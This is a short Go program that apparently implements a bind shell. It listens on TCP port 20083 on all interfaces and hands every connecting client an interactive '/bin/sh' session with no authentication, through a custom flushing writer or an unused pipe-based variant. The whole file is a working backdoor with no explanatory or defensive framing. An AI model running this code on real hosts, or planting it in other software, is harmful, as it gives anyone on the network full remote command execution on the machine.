package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// Write with semi-flush
func (f *Flusher) Write(b []byte) (int, error) {
	size, err := f.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := f.w.Flush(); err != nil {
		return -1, err
	}

	return size, nil // write and flush with new Flusher
}

func handler(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func pipe(conn net.Conn) {
	defer conn.Close()

	rp, wp := io.Pipe() // auto-flush

	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp) // conn -> reader_pipe -> writer_pipe -> stdout

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":20083")
	if err != nil {
		log.Fatalln("Unable bind to port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		go handler(conn)
	}
}
